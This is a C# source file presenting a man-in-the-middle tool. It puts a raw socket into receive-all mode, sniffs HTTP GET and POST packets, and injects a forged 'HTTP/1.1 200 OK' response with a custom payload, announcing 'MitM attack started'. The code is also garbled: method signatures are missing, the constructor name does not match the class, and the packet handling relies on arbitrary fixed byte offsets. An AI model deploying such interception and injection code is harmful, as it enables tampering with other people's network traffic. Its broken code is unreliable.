// This File Is The Main File, The Source (Everything Here) is on src/
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

public class App
{
    private readonly Socket _socket;
    private readonly byte[] _buffer = new byte[4096];

    public RawSocket()
    {
        _socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
    }

    public async Task StartCaptureAsync(Func<byte[], Task> packetHandler)
    {
        _socket.Bind(new IPEndPoint(IPAddress.Any, 0));
        _socket.IOControl(IOControlCode.ReceiveAll, new byte[] { 1, 0, 0, 0 }, null);

        while (true)
        {
            var received = await _socket.ReceiveAsync(_buffer, SocketFlags.None);
            if (received == 0)
                break;

            await packetHandler(_buffer.Take(received).ToArray());
        }
    }

    public async Task SendAsync(byte[] packet)
    {
        await _socket.SendAsync(packet, SocketFlags.None);
    }

{
    // Parse the packet to find the request and response parts
    // This is a simplified version and may not work for all packets

    var request = new byte[100];
    var response = new byte[100];

    // Modify the response to include a custom payload
    Array.Copy(packet, 0, request, 0, 100);
    Array.Copy(packet, 100, response, 0, 100);
    Array.Copy(Encoding.ASCII.GetBytes("HTTP/1.1 200 OK\r\nContent-Length: 12\r\n\r\nHello, MitM!"), 0, response, 0, 27);

    return (request, response);
  }

{
    var rawSocket = new RawSocket();
    await rawSocket.StartCaptureAsync(async packet =>
    {
        if (IsHttpPacket(packet)) // Implement this method to check if the packet is an HTTP packet
        {
            var (request, response) = ModifyHttpPacket(packet);
            await rawSocket.SendAsync(request);
            await rawSocket.SendAsync(response);
        }
    });

    Console.WriteLine("MitM attack started. Press any key to stop.");
    Console.ReadKey();
}
  
{
    // Check if the packet starts with "GET" or "POST" to identify HTTP packets
    // This is a simplified version and may not work for all packets

    return packet.Length >= 4 && Encoding.ASCII.GetString(packet, 0, 4) == "GET " || packet.Length >= 5 && Encoding.ASCII.GetString(packet, 0, 5) == "POST";
  }
}
